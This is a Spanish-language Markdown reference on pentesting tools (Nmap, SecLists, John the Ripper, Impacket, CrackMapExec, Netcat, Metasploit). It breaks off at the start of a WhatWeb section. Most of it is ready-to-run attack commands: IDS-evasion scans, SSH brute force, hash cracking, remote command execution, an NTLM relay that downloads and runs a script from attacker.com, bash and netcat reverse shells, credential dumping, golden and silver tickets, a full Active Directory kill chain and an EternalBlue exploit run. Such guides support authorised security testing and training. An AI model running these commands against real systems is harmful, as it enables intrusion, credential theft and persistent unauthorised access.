---
description: Guía completa de herramientas de pentesting - Nmap, Impacket, CrackMapExec, John The Ripper y más
---

# Herramientas de Pentesting

## Introducción

Este documento cubre las herramientas esenciales utilizadas en assessments de seguridad, con enfoque en enumeración, acceso, movimiento lateral y post-explotación. Cada herramienta se presenta con ejemplos prácticos y casos de uso comunes.

---

# Nmap - Network Mapper

## Introducción a Nmap

**Nmap** es la herramienta estándar de reconocimiento de redes y escaneo de puertos. Utiliza diversos métodos para descubrir hosts, puertos abiertos, servicios y sistemas operativos en una red.

### Instalación

```bash
# Debian/Ubuntu
sudo apt-get install nmap

# Verificar versión
nmap --version
```

## Parámetros de Configuración General

Estos parámetros **no afectan directamente al escaneo** pero son útiles para filtrar resultados y configurar el comportamiento:

| Parámetro | Descripción | Ejemplo |
|-----------|-------------|---------|
| `--open` | Mostrar solo puertos abiertos en los resultados | `nmap --open target.com` |
| `-oN <archivo>` | Exportar en formato normal (texto plano) | `-oN results.txt` |
| `-oG <archivo>` | Exportar en formato grepeable (para parseo) | `-oG results.grep` |
| `-oX <archivo>` | Exportar en formato XML | `-oX results.xml` |
| `-oA <prefijo>` | Exportar en TODOS los formatos simultáneamente | `-oA results` |
| `--min-rate N` | Mínimo de paquetes por segundo | `--min-rate 100` |
| `-T<0-5>` | Perfil de timing (T0=paranoico, T5=loco) | `-T4` |
| `-v, -vv` | Verbosidad (más detalles) | `-vv` |
| `--reason` | Mostrar razón por la cual clasificó un puerto | `--reason` |

## Descubrimiento de Hosts

### Concepto

El descubrimiento de hosts identifica qué máquinas están activas en la red antes de hacer escaneos detallados.

### Parámetros

| Parámetro | Descripción | Uso |
|-----------|-------------|-----|
| `-sn` | Ping sweep (ICMP + ARP) - No escanea puertos | `nmap -sn 192.168.1.0/24` |
| `-Pn` | Desactivar descubrimiento de hosts (asumir todo está vivo) | `nmap -Pn target.com` |
| `-PR` | ARP Ping (útil en LAN) | `nmap -PR target.com` |
| `-PS <puertos>` | TCP SYN Ping | `nmap -PS 80,443 target.com` |
| `-PA <puertos>` | TCP ACK Ping | `nmap -PA 80,443 target.com` |

### Ejemplos

**Ejemplo 1: Descubrimiento de hosts en la red local**

```bash
# Descubrir todos los hosts activos en la subred
nmap -sn 192.168.1.0/24
```

**Ejemplo 2: Descubrimiento sin resolución DNS**

```bash
# Escanear sin hacer lookups DNS (más rápido)
nmap -sn -n 192.168.1.0/24
```

**Ejemplo 3: Ping sweep con opciones avanzadas**

```bash
# Descubrimiento con ARP y TCP
nmap -sn -PR -PS 22,80,443 192.168.1.0/24 -oN discovered-hosts.txt
```

## Técnicas de Escaneo de Puertos

### Conceptos Fundamentales

Los puertos TCP pueden estar en estos estados:
- **Open**: Aceptando conexiones
- **Closed**: Rechazando conexiones (envía RST)
- **Filtered**: No hay respuesta (firewall probablemente)
- **Unfiltered**: Respondiendo pero estado indeterminado

### Técnicas de Escaneo

| Parámetro | Descripción | Ventajas | Desventajas |
|-----------|-------------|----------|------------|
| `-sT` | TCP Connect Scan | Fiable, no requiere root | Lento, registrado en logs |
| `-sS` | TCP SYN Scan (Stealth) | Rápido, sigiloso, no completa conexión | Requiere root |
| `-sU` | UDP Scan | Descubre servicios UDP | Lento (limitado por rate limit del SO) |
| `-sN/-sF/-sX` | Null/FIN/Xmas Scan | Evasión, RFC válido | Filtrado por firewalls modernas |
| `-sA` | TCP ACK Scan | Mapeo de firewalls | No determina si puerto está abierto |

### Ejemplos de Técnicas

**Ejemplo 1: SYN Scan (recomendado)**

```bash
# TCP SYN Scan - Rápido y sigiloso (requiere root)
sudo nmap -sS -p 22,80,443,3306,5432 192.168.1.50
```

**Ejemplo 2: TCP Connect Scan (sin necesidad de root)**

```bash
# TCP Connect Scan - Más lento pero no requiere privilegios
nmap -sT -p 1-1000 target.example.com
```

**Ejemplo 3: UDP Scan**

```bash
# Descubrir servicios UDP (más lento)
sudo nmap -sU -p 53,161,162,389,514 target.example.com
```

**Ejemplo 4: Escaneo de todos los puertos**

```bash
# Escanear todos los 65535 puertos (muy lento, típicamente 30+ minutos)
sudo nmap -sS -p- --min-rate 5000 target.example.com -oA all-ports

# Combinado con timing agresivo
sudo nmap -sS -p- -T4 --min-rate 5000 target.example.com
```

## Detección de Versiones y Servicios

### Parámetros

| Parámetro | Descripción | Ejemplo |
|-----------|-------------|---------|
| `-sV` | Detectar versión de servicios (fingerprinting) | `nmap -sV target.com` |
| `-sC` | Ejecutar scripts NSE de la categoría "default" | `nmap -sC target.com` |
| `--script <script>` | Ejecutar scripts NSE específicos | `--script vuln` |
| `-O` | Detectar sistema operativo | `nmap -O target.com` |
| `--osscan-limit` | Limitar detección de SO a hosts promisores | `--osscan-limit` |

### Ejemplo 1: Detección Completa de Servicios

```bash
# Detección de versión + scripts + OS (escaneo completo)
sudo nmap -sV -sC -O -p 22,80,443,3306 192.168.1.50 -oA complete-scan
```

### Ejemplo 2: Escaneo Agresivo

```bash
# Escaneo agresivo: todo lo anterior con timing agresivo
sudo nmap -A -T4 -p- target.example.com -oA aggressive-scan
```

### Ejemplo 3: Escaneo Sigiloso (para evitar detección)

```bash
# Escaneo lento y silencioso (timing T1)
nmap -sS -sV -sC -T1 --max-retries 1 target.example.com

# Fragmentar paquetes y usar decoys
sudo nmap -sS -f -D 192.168.1.1,192.168.1.2,ME target.example.com
```

## Scripts NSE (Nmap Scripting Engine)

### Categorías de Scripts

| Categoría | Propósito | Ejemplo |
|-----------|----------|---------|
| `auth` | Autenticación y credenciales | Bypasses, default creds |
| `broadcast` | Descubrimiento de hosts en red | ARP scan, DHCP |
| `brute` | Ataques de fuerza bruta | SSH, FTP, Samba |
| `default` | Scripts seguros y útiles por defecto | Información general |
| `discovery` | Enumeración de servicios | SNMP, DNS, LDAP |
| `dos` | Pruebas de denegación de servicio | Crashing, flooding |
| `exploit` | Exploits conocidos | RCE, información pública |
| `external` | Contactan servicios externos | Online checks, WHOIS |
| `fuzzer` | Fuzzing de protocolos | Envío de datos malformados |
| `intrusive` | Scripts que pueden afectar sistemas | Cambios, denegación de servicio |
| `malware` | Detección de malware | Búsqueda de backdoors |
| `safe` | Scripts que no causan daño | Recomendado para tests |
| `vuln` | Detección de vulnerabilidades | Exploits sin ejecutar |

### Uso de Scripts NSE

```bash
# Ejecutar categoría de scripts específica
nmap --script vuln target.example.com

# Ejecutar scripts concretos
nmap --script smb-os-discovery target.example.com

# Combinar categorías (scripts vuln AND safe)
nmap --script "vuln and safe" target.example.com

# Excluir scripts intrusivos
nmap --script "default and not intrusive" target.example.com

# Ver resultados de scripts específicos
nmap --script http-title,http-headers -p 80 target.example.com
```

### Ejemplo 1: Detección de Vulnerabilidades SMB

```bash
# Descubrir vulnerabilidades SMB (Eternal Blue, etc.)
sudo nmap --script smb-vuln-* -p 445 192.168.1.50
```

### Ejemplo 2: Enumeración LDAP

```bash
# Enumerar LDAP
nmap --script ldap-search -p 389 domain-controller.com

# Obtener información de dominio
nmap --script smb-os-discovery,smb-security-mode -p 445 dc.example.com
```

### Ejemplo 3: Auditoría HTTP

```bash
# Auditoría de servidor web
nmap --script http-title,http-headers,http-methods,ssl-cert -p 80,443 target.example.com
```

## Evasión y Ofuscación

### Técnicas de Evasión

| Parámetro | Descripción | Uso |
|-----------|-------------|-----|
| `-f` | Fragmentar paquetes en paquetes de 8 bytes | `nmap -f target.com` |
| `-D <IPs>` | Enviar paquetes decoy desde IPs especificadas | `nmap -D 192.168.1.1,ME target.com` |
| `--source-port N` | Especificar puerto origen (bypass de firewall) | `nmap --source-port 53 target.com` |
| `--data-length N` | Añadir bytes aleatorios al final del paquete | `nmap --data-length 100 target.com` |
| `--spoof-mac <MAC>` | Falsificar dirección MAC | `nmap --spoof-mac Apple target.com` |
| `-g N` | Alias para --source-port | `nmap -g 53 target.com` |
| `--decoy-timing <timing>` | Timing para decoys | `--decoy-timing same` |

### Ejemplos

**Ejemplo 1: Scan Fragmentado con Decoys**

```bash
# Fragmentar paquetes y usar decoys
sudo nmap -sS -f -D 192.168.1.1,192.168.1.2,ME -p 22,80,443 target.example.com
```

**Ejemplo 2: Escaneo desde Puerto Específico (DNS)**

```bash
# Escanear desde puerto 53 (para bypass de firewall)
sudo nmap -sS --source-port 53 -p 22,80,443 target.example.com
```

**Ejemplo 3: Ofuscación Total**

```bash
# Combinación de técnicas de ofuscación
sudo nmap -sS -f --data-length 100 -D 10.10.10.1,10.10.10.2,ME \
    --spoof-mac Cisco -p 22,80,443 target.example.com -T2 --min-rate 10
```

## Configuración de Resolución DNS

| Parámetro | Descripción | Ejemplo |
|-----------|-------------|---------|
| `-n` | Sin resolución DNS (más rápido) | `nmap -n target.com` |
| `-R` | Resolver todos los IPs (incluso offline) | `nmap -R target.com` |
| `--dns-servers <IPs>` | Usar servidores DNS específicos | `--dns-servers 8.8.8.8,8.8.4.4` |

### Ejemplo

```bash
# Escaneo sin DNS (más rápido en red local)
nmap -n -sS -p 22,80,443 192.168.1.0/24
```

## Ejemplos de Flujos de Trabajo Completos

### Workflow 1: Reconocimiento Inicial (3 pasos)

```bash
# Paso 1: Descubrir hosts
nmap -sn -T4 192.168.1.0/24 -oN discovered.txt

# Paso 2: Escaneo de puertos comunes
nmap -sS -T4 -p 22,80,443,3306,5432 192.168.1.50 -oA common-ports

# Paso 3: Escaneo completo con versiones
nmap -sV -sC -p 22,80,443 192.168.1.50 -oA complete
```

### Workflow 2: Escaneo Exhaustivo (Low and Slow)

```bash
# Todos los puertos con versiones (45+ minutos)
sudo nmap -sS -sV -p- -T2 --min-rate 50 target.example.com \
    --open -oA full-scan

# Luego ejecutar scripts en puertos encontrados
nmap --script "vuln and safe" -p <puertos_encontrados> target.example.com
```

---

# SecLists - Diccionarios y Wordlists

## Introducción

**SecLists** es una colección extensa de diccionarios, payloads y patrones utilizados en fuzzing, ataques de fuerza bruta y descubrimiento en assessments de seguridad.

### Instalación

```bash
# Clonar desde GitHub
git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists

# En Kali Linux ya está preinstalado
ls /usr/share/seclists
```

### Estructura de Directorios

```
SecLists/
├── Discovery/           # Enumeración y descubrimiento
│   ├── DNS/            # Subdominios, wildcards
│   └── Web-Content/    # Directorios, archivos
├── Fuzzing/            # Payloads para fuzzing
├── Passwords/          # Diccionarios de contraseñas
├── Usernames/          # Diccionarios de usuarios
├── Payloads/           # Payloads especializados (RCE, Injection, etc.)
├── Web-Shells/         # Shells web
└── IOCs/               # Indicadores de compromiso
```

## Diccionarios de Descubrimiento Web

| Nombre | Ruta | Entradas | Descripción | Caso de Uso |
|--------|------|----------|-------------|------------|
| **common.txt** | `Discovery/Web-Content/common.txt` | ~4,700 | Directorios/archivos muy comunes | Fuzzing inicial rápido |
| **raft-small-words.txt** | `Discovery/Web-Content/raft-small-words.txt` | ~55,000 | Palabras pequeñas ordenadas por frecuencia | Fuzzing rápido |
| **raft-medium-directories.txt** | `Discovery/Web-Content/raft-medium-directories.txt` | ~30,000 | Directorios ordenados por frecuencia | Fuzzing estándar |
| **raft-medium-files.txt** | `Discovery/Web-Content/raft-medium-files.txt` | ~32,000 | Archivos ordenados por frecuencia | Fuzzing de archivos |
| **big.txt** | `Discovery/Web-Content/big.txt` | ~20,000 | Palabras ordenadas por frecuencia | Fuzzing completo |
| **directory-list-2.3-medium.txt** | `Discovery/Web-Content/directory-list-2.3-medium.txt` | ~220,000 | Directorio grande de fuerza bruta | Escaneo exhaustivo |

### Ejemplo de Uso

```bash
# Fuzzing rápido con wordlist pequeño
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://target.com/FUZZ

# Fuzzing más completo
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u http://target.com/FUZZ
```

## Diccionarios de Subdominios

| Nombre | Ruta | Entradas | Descripción |
|--------|------|----------|-------------|
| **subdomains-top1million-5000.txt** | `Discovery/DNS/subdomains-top1million-5000.txt` | 5,000 | Top 5K subdominios (más rápido) |
| **subdomains-top1million-110000.txt** | `Discovery/DNS/subdomains-top1million-110000.txt` | 110,000 | Top 110K subdominios (exhaustivo) |
| **fierce-hostlist.txt** | `Discovery/DNS/fierce-hostlist.txt` | ~5,000 | Hostlist de Fierce |
| **subdomains-top1million-20000.txt** | `Discovery/DNS/subdomains-top1million-20000.txt` | 20,000 | Balance entre velocidad y cobertura |

### Ejemplo

```bash
# Enumerar subdominios (rápido)
gobuster dns -d target.com \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

# Enumeración exhaustiva
gobuster dns -d target.com \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50
```

## Diccionarios de Usuarios y Contraseñas

| Tipo | Ruta | Entradas | Descripción |
|------|------|----------|-------------|
| **Usuarios comunes** | `Usernames/top-usernames-shortlist.txt` | ~1,000 | Top usuarios (versión corta) |
| **Usuarios (largo)** | `Usernames/xato-net-10-million-usernames.txt` | 10M | Base completa (muy grande) |
| **Top 1000 contraseñas** | `Passwords/Common-Credentials/10-million-password-list-top-1000.txt` | 1,000 | Top 1000 contraseñas globales |
| **RockYou.txt** | `Passwords/Leaked-Databases/rockyou.txt` | 14.3M | Base de datos filtraba RockYou (muy usada) |
| **Rockyou (100k)** | `Passwords/Leaked-Databases/rockyou-75.txt` | ~100,000 | Primeras 100k más comunes |

### Ejemplo

```bash
# Ataque de fuerza bruta SSH
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
      ssh://target.example.com
```

## Payloads Especializados

| Tipo | Ruta | Descripción |
|------|------|-------------|
| **SQL Injection** | `Payloads/SQL-Injection/` | Payloads para SQLi |
| **XXE** | `Payloads/XXE/` | Payloads XXE |
| **SSRF** | `Payloads/SSRF/` | Payloads SSRF |
| **RCE** | `Payloads/RCE/` | Remote Code Execution |
| **Web Shells** | `Web-Shells/` | Shells web previamente crafted |

---

# John The Ripper

## Introducción

**John The Ripper** es la herramienta estándar para cracking de hashes y contraseñas en sistemas Unix/Linux. También puede romper archivos comprimidos, PDFs, Office files, etc.

### Instalación

```bash
# Debian/Ubuntu
sudo apt-get install john

# O compilar desde fuente para versiones más nuevas
git clone https://github.com/openwall/john.git
cd john/src && ./configure && make
```

### Modos de Operación

| Modo | Descripción | Comando |
|------|-------------|---------|
| **Wordlist** | Ataque de diccionario | `john --wordlist=dict.txt hashes.txt` |
| **Single** | Utiliza información del archivo como palabras | `john --single hashes.txt` |
| **Incremental** | Fuerza bruta (muy lento) | `john --incremental hashes.txt` |
| **Mask** | Ataque por patrón personalizado | `john --mask=?a?a?a?a hashes.txt` |

## Extracción de Hashes

John incluye herramientas para extraer hashes de diferentes formatos:

| Herramienta | Propósito | Uso |
|-------------|----------|-----|
| **zip2john** | Extraer hash de ZIP protegido | `zip2john archive.zip > hash.txt` |
| **rar2john** | Extraer hash de RAR | `rar2john archive.rar > hash.txt` |
| **pdf2john** | Extraer hash de PDF | `pdf2john encrypted.pdf > hash.txt` |
| **keepass2john** | Extraer de KeePass | `keepass2john database.kdbx > hash.txt` |
| **ssh2john** | Extraer de SSH privado key | `ssh2john id_rsa > hash.txt` |
| **office2john** | Office files (Word, Excel) | `office2john doc.docx > hash.txt` |
| **unshadow** | Combinar /etc/passwd y /etc/shadow | `unshadow passwd shadow > hashes.txt` |

### Ejemplo 1: Cracking de ZIP

```bash
# Extraer hash del ZIP
zip2john secret.zip > zip_hash.txt

# Crackear con diccionario
john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt zip_hash.txt

# Ver contraseña encontrada
john --show zip_hash.txt
```

### Ejemplo 2: Cracking de Unix/Linux Hashes

```bash
# Combinar passwd y shadow extraídos
unshadow /path/to/passwd /path/to/shadow > hashes.txt

# Crackear con diccionario
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt hashes.txt

# Crackear con fuerza bruta incremental (lento)
john --incremental=Lower hashes.txt

# Ver todas las contraseñas crakadas
john --show hashes.txt
```

### Ejemplo 3: Cracking de SSH Keys

```bash
# Convertir SSH key privada a hash
ssh2john id_rsa > ssh_hash.txt

# Crackear
john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt ssh_hash.txt

# Obtener contraseña
john --show ssh_hash.txt
```

### Ejemplo 4: Uso de Diccionario Personalizado

```bash
# Generar diccionario personalizado basado en información de la empresa
# (nombres, ubicaciones, etc.)
cat > custom.txt << 'EOF'
password
123456
admin
company2024
EOF

# Crackear
john --wordlist=custom.txt hashes.txt
```

---



# Impacket & CrackMapExec (CME)

## Introducción

**Impacket** es una colección de scripts Python para interactuar con protocolos de red Windows (SMB, Kerberos, RPC, LDAP, etc.). **CrackMapExec (CME)** es una herramienta que automatiza múltiples ataques contra entornos Windows a escala.

### Instalación

```bash
# Impacket
git clone https://github.com/fortra/impacket.git
cd impacket
pip install -r requirements.txt
python setup.py install

# CrackMapExec
sudo apt-get install crackmapexec

# Verificar instalación
impacket-smbclient --help
cme --version
```

## Fase 1: Reconocimiento (Recon)

### Herramientas de Recon

| Herramienta | Protocolo | Propósito | Caso de Uso |
|-------------|-----------|----------|------------|
| **rpcdump.py** | RPC/MSRPC | Enumerar interfaces RPC | Identificar servicios vulnerables |
| **lookupsid.py** | SMB + SAMR | Enumerar usuarios por RID | Inventario de cuentas |
| **samrdump.py** | SMB + SAMR | Información de SAMR | Extractor de información local |
| **smbclient.py** | SMB | Cliente SMB interactivo | Revisar shares y permisos |
| **GetUserSPNs.py** | Kerberos | Detectar cuentas con SPN | Prepping para Kerberoasting |
| **findDelegation.py** | LDAP/Kerberos | Descubrir delegaciones AD | Mapeo de escalada |
| **CME enum** | SMB/LDAP | Enumeración masiva | Recon a escala |

### Ejemplo 1: Enumeración de Hosts SMB

```bash
# Enumerar información básica de servidor SMB
impacket-smbclient -N \\\\192.168.1.50\\share

# Conectarse a un share específico (sin autenticación)
impacket-smbclient \\\\192.168.1.50\\Users
```

### Ejemplo 2: Enumeración de RPC

```bash
# Enumerar interfaces RPC disponibles
impacket-rpcdump 192.168.1.50
```

### Ejemplo 3: Enumeración de Usuarios (RID Cycling)

```bash
# Enumerar usuarios conocidos por RID cycling
impacket-lookupsid -no-pass 192.168.1.50
```

### Ejemplo 4: Enumeración LDAP/AD

```bash
# Enumerar directorio activo (anónimo)
impacket-ldapdomaindump 192.168.1.50 -u 'DOMAIN\user' -p 'password' -o /tmp/dump

# Resultado: Genera archivos CSV con usuarios, grupos, máquinas, etc.
ls /tmp/dump/
# domain_computers.csv
# domain_groups.csv
# domain_users.csv
```

### Ejemplo 5: CrackMapExec - Enumeración Masiva

```bash
# Enumeración rápida de múltiples hosts
cme smb 192.168.1.0/24 -u 'DOMAIN\user' -p 'password' --shares
# Información del SO
cme smb 192.168.1.0/24 --shares -u '' -p '' --no-bruteforce
```

---

## Fase 2: Acceso (Gaining Access)

### Validación de Credenciales

```bash
# Probar credenciales contra múltiples hosts
cme smb 192.168.1.0/24 -u 'DOMAIN\user' -p 'password' --shares

# Probar lista de usuarios y contraseñas
cme smb 192.168.1.50 -u users.txt -p passwords.txt --no-bruteforce

# Verificar nulo session (sin credenciales)
cme smb 192.168.1.50 -u '' -p '' --shares
```

---

## Fase 3: Ejecución Remota (RCE)

### Técnicas de RCE

| Herramienta | Método | Ventajas | Desventajas |
|-------------|--------|----------|------------|
| **wmiexec.py** | WMI/DCOM | Sigiloso, sin servicios persistentes | Puede ser detectado |
| **atexec.py** | Tareas programadas | Sigiloso, sin WMI | Requiere permisos adicionales |
| **psexec.py** | SMB + Servicio | Confiable, robusto | Crea servicio, más detectable |
| **dcomexec.py** | DCOM | Alternativa a WMI | Más experimental |

### Ejemplo 1: Ejecución con WMIExec

```bash
# Ejecutar comando remoto por WMI (interactivo)
impacket-wmiexec 'DOMAIN\user:password@192.168.1.50'

# Dentro de la sesión interactiva:
> whoami
DOMAIN\user

> ipconfig
Windows IP Configuration
...

> exit
```

### Ejemplo 2: Ejecución con PSExec

```bash
# Ejecutar comando remoto por PsExec (estilo Sysinternals)
impacket-psexec 'DOMAIN\user:password@192.168.1.50' cmd.exe

# Comando no interactivo
impacket-psexec -c /tmp/myscript.bat 'DOMAIN\user:password@192.168.1.50'
```

### Ejemplo 3: Ejecución con ATExec (Task Scheduler)

```bash
# Ejecutar a través de Task Scheduler
impacket-atexec 'DOMAIN\user:password@192.168.1.50' 'whoami > C:\\Temp\\output.txt'
```

### Ejemplo 4: CrackMapExec - RCE Masivo

```bash
# Ejecutar comando en múltiples hosts
cme smb 192.168.1.0/24 -u 'DOMAIN\user' -p 'password' -x 'whoami'

# Ejecutar PowerShell
cme smb 192.168.1.0/24 -u 'DOMAIN\user' -p 'password' -X 'Get-Process'
```

---

## Fase 4: Relay y Movimiento Lateral

### NTLM Relay

```bash
# Configurar relay NTLM contra SMB
impacket-ntlmrelayx -t 192.168.1.50 -c 'whoami'

# Configurar relay contra LDAP (para dump AD)
impacket-ntlmrelayx -t 192.168.1.50 -t ldap:// --dump-adcs

# Reverse shell via relay
impacket-ntlmrelayx -t 192.168.1.50 -c 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/rev.ps1\")"'
```

### Servidor SMB Cebo

```bash
# Cazar credenciales con servidor SMB falso
impacket-smbserver -c 'whoami' -comment-response "You need SMB" share $(pwd)

# Las víctimas que intenten acceder ejecutarán el comando
```

---

## Fase 5: Kerberos

### Kerberoasting (Extraer TGS de cuentas de servicio)

```bash
# Listar cuentas con SPN
impacket-GetUserSPNs -request 'DOMAIN\user:password@192.168.1.50'


# Crackear offline
john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt hashes.txt
```

### ASREPRoasting (Usuarios sin preauth)

```bash
# Buscar cuentas sin preauth
impacket-GetNPUsers -request 'DOMAIN/user:password' 'DOMAIN/'

# Crackear
john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt tgt_hashes.txt
```

### Creación de Tickets Kerberos

```bash
# Crear TGT personalizado (golden ticket)
impacket-ticketer -nthash <KRBTGT_NTHASH> -domain-sid <DOMAIN_SID> \
    -domain <DOMAIN> -user Administrator

# Usar ticket para acceso
export KRB5CCNAME=./Administrator.ccache
impacket-smbclient -k 192.168.1.50
```

---

## Fase 6: Extracción de Secretos

### Volcado de Hashes del Sistema

```bash
# Extraer SAM, LSA y NTDS
impacket-secretsdump 'DOMAIN\user:password@192.168.1.50'


# Desde Domain Controller (NTDS.dit)
impacket-secretsdump -ntds /path/to/ntds.dit -system /path/to/SYSTEM
```

### DPAPI - Lectura de Datos Protegidos

```bash
# Si se conocen las claves DPAPI
impacket-dpapi 'DOMAIN\user:password@192.168.1.50'

# Decodificar credenciales guardadas
```

---

## Fase 7: Persistencia

### Agregar Máquina a AD

```bash
# Crear cuenta de máquina
impacket-addcomputer 'DOMAIN\user:password' -computer-name 'FAKE_MACHINE' \
    -computer-pass 'VeryStrongPassword123'

# Ahora la máquina falsa puede autenticarse en el dominio
```

### Persistencia con Tickets Kerberos

```bash
# Golden Ticket (acceso perpetuo como DA)
impacket-ticketer -nthash <KRBTGT_HASH> \
    -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
    -user Administrator

# Silver Ticket (acceso a servicio específico)
impacket-ticketer -nthash <SERVICE_HASH> -spn HTTP/webserver \
    -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
    -user Administrator
```

---

## Ejemplo de Ataque Completo (Kill Chain)

```bash
# 1. Recon
cme smb 192.168.1.0/24 --shares -u '' -p ''

# 2. Enumerar usuarios
impacket-lookupsid -no-pass 192.168.1.50

# 3. Obtener TGS (Kerberoasting)
impacket-GetUserSPNs -request 'DOMAIN\user:password@192.168.1.50'

# 4. Crackear TGS
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt spn_hashes.txt

# 5. RCE con credenciales crakadas
impacket-wmiexec 'DOMAIN\ServiceAccount:newpassword@192.168.1.50'

# 6. Extraer secretos
impacket-secretsdump 'DOMAIN\ServiceAccount:newpassword@192.168.1.50'

# 7. Golden Ticket para persistencia
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> \
    -domain DOMAIN -user Administrator
```

---

# CrackMapExec (CME) - Referencia Rápida

## Módulos Útiles

```bash
# Enumeración
cme smb 192.168.1.0/24 -u user -p pass --shares           # Shares
cme smb 192.168.1.0/24 -u user -p pass --sessions         # Sesiones activas
cme smb 192.168.1.0/24 -u user -p pass --lsa-dump         # Dumping LSA
cme smb 192.168.1.0/24 -u user -p pass --sam-dump         # Dumping SAM

# Ejecución
cme smb 192.168.1.0/24 -u user -p pass -x 'whoami'        # CMD
cme smb 192.168.1.0/24 -u user -p pass -X 'whoami'        # PowerShell

# Módulos de CME
cme smb 192.168.1.0/24 -u user -p pass -M mimikatz         # Mimikatz
cme smb 192.168.1.0/24 -u user -p pass -M bloodhound       # BloodHound
cme smb 192.168.1.0/24 -u user -p pass -M enum_shares      # Enum shares
```

---

# NetCat

## Introducción

**Netcat** es la herramienta "navaja suiza" para red: crear listeners, realizar conexiones, transferir datos, etc.

### Instalación

```bash
sudo apt-get install netcat-openbsd
# o
sudo apt-get install netcat-traditional
```

### Uso Básico

| Tarea | Comando |
|-------|---------|
| **Listener** | `nc -nlvp 4444` |
| **Conectarse** | `nc 192.168.1.50 4444` |
| **Transferir archivo** | `nc -q 1 IP puerto < archivo.txt` |
| **Recibir archivo** | `nc -nlvp 4444 > archivo.txt` |
| **Reverse shell** | `nc -e /bin/bash IP puerto` |
| **Escaneo de puertos** | `nc -zv IP 1-100` |

### Ejemplos

**Ejemplo 1: Listener Simple**

```bash
# Terminal 1 - Crear listener
nc -nlvp 4444

# Terminal 2 - Conectarse
nc 192.168.1.50 4444

# Ahora puedes enviar/recibir comandos
```

**Ejemplo 2: Transferir Archivo**

```bash
# Lado receptor
nc -nlvp 4444 > archivo_recibido.txt

# Lado transmisor
nc 192.168.1.50 4444 < archivo_original.txt
```

**Ejemplo 3: Reverse Shell (post-explotación)**

```bash
# Atacante: Listener
nc -nlvp 4444

# Víctima: Conectar con reverse shell
bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
# o
nc -e /bin/bash 192.168.1.50 4444
```

**Ejemplo 4: Escaneo Rápido de Puertos**

```bash
# Escanear puertos comunes
nc -zv 192.168.1.50 22 80 443 3306 5432

```

---

# Metasploit Framework (MSFConsole)

## Introducción

**Metasploit Framework** es la herramienta más completa para development de exploits, post-explotación y testing de vulnerabilidades.

### Instalación

```bash
# Ya está preinstalado en Kali Linux
msfconsole

# En otras distros
sudo apt-get install metasploit-framework
```

## Flujo de Trabajo Básico

```
1. Buscar módulo (search)
   ↓
2. Seleccionar módulo (use)
   ↓
3. Ver opciones (show options)
   ↓
4. Configurar (set/unset)
   ↓
5. Ejecutar (run/exploit)
```

### Comandos Esenciales

| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| **search** | Buscar exploits/módulos | `search smb_ms17_010` |
| **use** | Seleccionar módulo | `use exploit/windows/smb/ms17_010_eternalblue` |
| **show options** | Ver parámetros requeridos | `show options` |
| **show payloads** | Listar payloads disponibles | `show payloads` |
| **show targets** | Ver objetivos (SO, versiones) | `show targets` |
| **info** | Ver información del módulo | `info` |
| **set** | Configurar parámetro | `set LHOST 192.168.1.50` |
| **unset** | Desconfigurar parámetro | `unset LHOST` |
| **run/exploit** | Ejecutar módulo | `exploit` |
| **check** | Probar si objetivo es vulnerable (sin explotar) | `check` |
| **background** | Poner en segundo plano | `background` |

### Ejemplo 1: Búsqueda y Uso

```bash
# 1. Buscar exploit SMB
search type:exploit smb

# 2. Usar exploit específico
use exploit/windows/smb/ms17_010_eternalblue

# 3. Ver opciones
show options

# 4. Configurar
set RHOSTS 192.168.1.50
set LHOST 192.168.1.100
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp

# 5. Mostrar configuración
show options

# 6. Verificar si es vulnerable
check

# 7. Explotar
exploit
```

### Ejemplo 2: Creación de Payload Personalizado

```bash
# 1. Buscar reverse shell
search type:payload windows reverse

# 2. Usar payload
use windows/meterpreter/reverse_tcp

# 3. Configurar
set LHOST 192.168.1.50
set LPORT 4444

# 4. Generar
generate -f exe -o shell.exe

# Ahora ejecutar shell.exe en la víctima para conectar de vuelta
```

### Ejemplo 3: Manejo de Sesiones

```bash
# Ver todas las sesiones activas
sessions -l

# Interactuar con una sesión
sessions -i 1

# En una sesión Meterpreter
meterpreter > shell              # Shell interactivo
meterpreter > sysinfo            # Información del sistema
meterpreter > getuid             # Usuario actual
meterpreter > hashdump           # Extraer hashes SAM
meterpreter > ps                 # Listar procesos
meterpreter > migrate 4356       # Migrar a proceso
meterpreter > background         # Poner en background
```

### Ejemplo 4: Multi-handler para Reverse Shells

```bash
# Configurar listener para múltiples conexiones
use exploit/multi/handler

# Configurar
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Ejecutar
exploit -j      # Background
exploit -j -z   # No interactuar inmediatamente

# Las víctimas que ejecuten el payload se conectarán automáticamente
```

### Estructura de Sesiones

```
Meterpreter (Windows Shell Avanzado)
  - Acceso a sistema de archivos
  - Dump de credenciales
  - Ejecución de código
  - Escalada de privilegios

Shell (CMD de Windows)
  - Acceso básico a línea de comandos
  - Menos funcionalidades

Kali Shell
  - Shell bash en Linux
  - Control total del sistema
```

---

# WhatWeb - Identificación de Tecnologías

## Introducción

**WhatWeb** identifica tecnologías web en uso: CMS, servidores web, aplicaciones, frameworks, bibliotecas JavaScript, etc.

### Instalación

```bash
# Ya viene en Kali Linux
whatweb --version

# En otras distros
